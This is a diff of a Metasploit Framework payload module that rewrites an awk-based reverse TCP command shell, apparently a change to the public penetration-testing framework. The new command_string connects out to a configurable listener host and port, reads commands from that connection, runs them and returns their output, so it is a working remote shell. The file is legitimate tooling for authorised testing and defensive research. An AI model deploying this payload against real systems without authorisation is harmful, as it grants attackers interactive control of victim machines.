@@ -3,13 +3,10 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core/handler/reverse_tcp'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 150
+  CachedSize = 154
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -50,6 +47,20 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    "awk 'BEGIN{s=\"/inet/tcp/0/#{datastore['LHOST']}/#{datastore['LPORT']}\";while(1){do{s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!=\"exit\");close(s)}}'"
+    awkcmd = <<~AWK
+      awk 'BEGIN{
+        s=\"/inet/tcp/0/#{datastore['LHOST']}/#{datastore['LPORT']}\";
+        do{
+          if((s|&getline c)<=0)
+            break;
+          if(c){
+            while((c|&getline)>0)print $0|&s;
+            close(c)
+          }
+        } while(c!=\"exit\")
+        close(s)
+      }'
+    AWK
+    awkcmd.gsub!("\n",'').gsub!('  ', '')
   end
 end
